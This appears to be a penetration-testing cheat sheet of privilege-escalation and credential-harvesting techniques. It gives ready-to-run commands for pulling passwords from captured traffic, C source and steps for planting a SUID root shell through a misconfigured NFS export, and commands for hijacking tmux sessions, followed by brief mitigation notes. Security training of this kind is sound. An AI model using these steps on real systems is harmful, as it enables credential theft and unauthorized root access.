# Miscellaneous Techniques

## Passive Traffic Capture

### Capture Traffic
```bash
sudo tcpdump -i <interface> -w capture.pcap
```

### Parse Credentials (if tools installed)

```bash
net-creds capture.pcap
PCredz capture.pcap
```

### Extract Auth Fields via tshark

```bash
tshark -r capture.pcap -T fields \
  -e http.authorization -e ftp.password -e pop.password \
  -e imap.password -e telnet.password -e smtp.password
```

### GUI Analysis

```bash
wireshark capture.pcap
```

---

## Weak NFS Privileges

### Show NFS Exports

```bash
showmount -e <nfs_server_ip>
```

### View Exports

```bash
cat /etc/exports
```

### Mount NFS Share

```bash
sudo mount -t nfs <nfs_server_ip>:/<export_path> /mnt
```

### Create SUID Shell

```bash
cat > shell.c << 'EOF'
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main() { setuid(0); setgid(0); system("/bin/bash"); }
EOF

gcc shell.c -o shell
cp shell /mnt
sudo chmod u+s /mnt/shell
```

### Execute on Target

```bash
./shell
```

### Unmount

```bash
sudo umount /mnt
```

---

## Hijacking tmux Sessions

### Identify tmux Processes

```bash
ps aux | grep tmux
```

### Check Socket Permissions

```bash
ls -la /tmp/tmux-* 2>/dev/null
```

### Attach to Session (if permitted)

```bash
tmux -S <tmux_socket> attach
```

### Create Shared Session (example)

```bash
tmux -S /shareds new -s debugsess
```

### Change Socket Ownership (example)

```bash
sudo chown root:devs /shareds
```

---

## Key Concepts

### Passive Traffic Capture

* Cleartext protocols leak passwords.
* Tools like tcpdump, net-creds, PCredz can pull credentials from pcap.
* Mitigation: encrypt traffic (SSH/HTTPS/TLS), segmentation.

### Weak NFS Privileges

* `no_root_squash` makes remote root = local root.
* Allows SUID binary creation - instant root on server.
* Mitigation: use `root_squash`, restrict exports.

### Tmux Hijacking

* tmux sockets with weak permissions allow session takeover.
* If root runs tmux with 777 or group-writable socket - privilege escalation.
* Mitigation: secure socket permissions, avoid privileged tmux.
